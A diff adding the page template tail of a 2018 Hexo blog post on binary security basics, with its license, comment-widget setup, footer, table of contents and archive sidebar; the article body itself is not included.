+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://daddyhonggg.github.io">OtterV</a>
+            <p>原文链接：<a href="https://daddyhonggg.github.io/2018/09/10/20180910bsb/">https://daddyhonggg.github.io/2018/09/10/20180910bsb/</a>
+            <p>发表日期：<a href="https://daddyhonggg.github.io/2018/09/10/20180910bsb/">September 10th 2018, 6:54:17 pm</a>
+            <p>更新日期：<a href="https://daddyhonggg.github.io/2018/09/10/20180910bsb/">September 23rd 2018, 7:07:40 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/09/12/20180912bcdtts/" title= "Ubuntu Linux 虚拟机 + IDA 动态调试 Welcome">
+                    <div class="nextTitle">Ubuntu Linux 虚拟机 + IDA 动态调试 Welcome</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/09/06/20180906cpuse/" title= "About Computer Easy Using">
+                    <div class="prevTitle">About Computer Easy Using</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="comment"></div>
+    <script>
+    new Valine({
+        el: '#comment' ,
+        notify:false, 
+        verify:false, 
+        appId: "nNBXAkxhHnRSmyrTGkGqWol2-gzGzoHsz",
+        appKey: "8ORVnQBXp9DfAFfPTmEWk4OI",
+        placeholder: "\( ` o * )/",
+        path:window.location.pathname, 
+        avatar:'mm' 
+    });
+    </script>
+
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:daddy_hong@foxmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/daddyhonggg" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#暑期自学知识复习"><span class="toc-number">1.</span> <span class="toc-text">暑期自学知识复习</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00-栈帧"><span class="toc-number">1.1.</span> <span class="toc-text">0x00 栈帧</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-销毁栈帧的两种写法："><span class="toc-number">1.1.1.</span> <span class="toc-text">1.销毁栈帧的两种写法：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-压参的两种写法："><span class="toc-number">1.1.2.</span> <span class="toc-text">2.压参的两种写法：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-两个很棒的例题："><span class="toc-number">1.1.3.</span> <span class="toc-text">3.两个很棒的例题：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-汇编基础"><span class="toc-number">1.2.</span> <span class="toc-text">0x01 汇编基础</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-16位、32位、64位汇编区别"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.16位、32位、64位汇编区别</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-lea"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.lea</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-test"><span class="toc-number">1.2.3.</span> <span class="toc-text">3.test</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-例题"><span class="toc-number">1.2.4.</span> <span class="toc-text">3.例题</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-函数调用约定"><span class="toc-number">1.3.</span> <span class="toc-text">0x02 函数调用约定</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-PE头"><span class="toc-number">1.4.</span> <span class="toc-text">0x03 PE头</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-IDA常用操作（先码为敬orz）"><span class="toc-number">1.5.</span> <span class="toc-text">0x04 IDA常用操作（先码为敬orz）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-IDA常用快捷键"><span class="toc-number">1.5.1.</span> <span class="toc-text">1.IDA常用快捷键</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-IDA插件"><span class="toc-number">1.5.2.</span> <span class="toc-text">2.IDA插件</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-小结"><span class="toc-number">1.6.</span> <span class="toc-text">0x04 小结</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 13
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2018/11/06/2018rop/" >ROP_lev</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2018/11/06/2018reverse/" >逆向题目WriteUPs</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/23</span><a class="archive-post-title" href= "/2018/10/23/20181023tpv/" >欲望，道德与逃离</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/23</span><a class="archive-post-title" href= "/2018/10/23/20181022zyc/" >栈溢出漏洞及其利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/21</span><a class="archive-post-title" href= "/2018/10/21/20181021wmm/" >Salty</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/10</span><a class="archive-post-title" href= "/2018/10/10/20181010Vigenere/" >Vigenere破解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/12</span><a class="archive-post-title" href= "/2018/09/12/20180912bcdtts/" >Ubuntu Linux 虚拟机 + IDA 动态调试 Welcome</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/10</span><a class="archive-post-title" href= "/2018/09/10/20180910bsb/" >Binary security 基础</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/06</span><a class="archive-post-title" href= "/2018/09/06/20180906cpuse/" >About Computer Easy Using</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/18</span><a class="archive-post-title" href= "/2018/08/18/20180818tz/" >亲爱的泰呆呆：</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/14</span><a class="archive-post-title" href= "/2018/08/14/20180814fzcp/" >肥宅的快乐-维他测评</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/12</span><a class="archive-post-title" href= "/2018/08/12/20180812start/" >BLOG:DADDY_HONG‘s の start</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/08</span><a class="archive-post-title" href= "/2018/04/08/201804gets/" >关于gets()的危险（不安全）性</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="C"><span class="iconfont-archer">&#xe606;</span>C</span>
+    
+        <span class="sidebar-tag-name" data-tags="Blog"><span class="iconfont-archer">&#xe606;</span>Blog</span>
+    
+        <span class="sidebar-tag-name" data-tags="EAT"><span class="iconfont-archer">&#xe606;</span>EAT</span>
+    
+        <span class="sidebar-tag-name" data-tags="for"><span class="iconfont-archer">&#xe606;</span>for</span>
+    
+        <span class="sidebar-tag-name" data-tags="computer"><span class="iconfont-archer">&#xe606;</span>computer</span>
+    
+        <span class="sidebar-tag-name" data-tags="Binary Security"><span class="iconfont-archer">&#xe606;</span>Binary Security</span>
+    
+        <span class="sidebar-tag-name" data-tags="Reverse"><span class="iconfont-archer">&#xe606;</span>Reverse</span>
+    
+        <span class="sidebar-tag-name" data-tags="Reading"><span class="iconfont-archer">&#xe606;</span>Reading</span>
+    
+        <span class="sidebar-tag-name" data-tags="Movie"><span class="iconfont-archer">&#xe606;</span>Movie</span>
+    
+        <span class="sidebar-tag-name" data-tags="Programming"><span class="iconfont-archer">&#xe606;</span>Programming</span>
+    
+        <span class="sidebar-tag-name" data-tags="Cryptography"><span class="iconfont-archer">&#xe606;</span>Cryptography</span>
+    
+        <span class="sidebar-tag-name" data-tags="Pwn"><span class="iconfont-archer">&#xe606;</span>Pwn</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "OtterV"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
